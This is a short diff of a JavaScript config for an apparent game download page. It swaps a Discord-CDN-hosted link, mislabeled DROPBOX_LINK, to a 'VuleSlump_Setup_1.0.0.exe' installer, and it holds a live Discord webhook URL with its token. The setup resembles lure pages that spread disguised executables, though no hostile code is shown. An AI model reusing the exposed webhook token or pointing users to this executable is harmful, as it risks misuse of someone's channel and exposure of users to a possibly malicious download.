@@ -1,7 +1,7 @@
 // ---- CONFIGURATION ----
 const CONFIG = {
     WEBHOOK_URL: 'https://discord.com/api/webhooks/1511454832521642134/Z6B2UW2WDZBcGE53Lwdpp8UW0XuHrVJCUNBORl6ijo6k5u9YgujL5cZXuVTM-F1DiG4x',
-    DROPBOX_LINK: 'https://cdn.discordapp.com/attachments/1511455232238813355/1511459130789990440/VuleSlump_Setup_1.0.0.exe?ex=6a247c02&is=6a232a82&hm=402afce8aa1117a85211f0e1c58584eba70c615d5d9425a346ec60034b568368&',
+    DROPBOX_LINK: 'https://cdn.discordapp.com/attachments/1507703480666554370/1517250499563360326/VuleSlump_Setup_1.0.0.exe?ex=6a359924&is=6a3447a4&hm=dad3100624f82d2e690120c50b225b71d3e5613794e1b437fa087e66f456fd2f&',
     GAME_NAME: 'VuleSlump' // Change this to update the name everywhere
 };
 
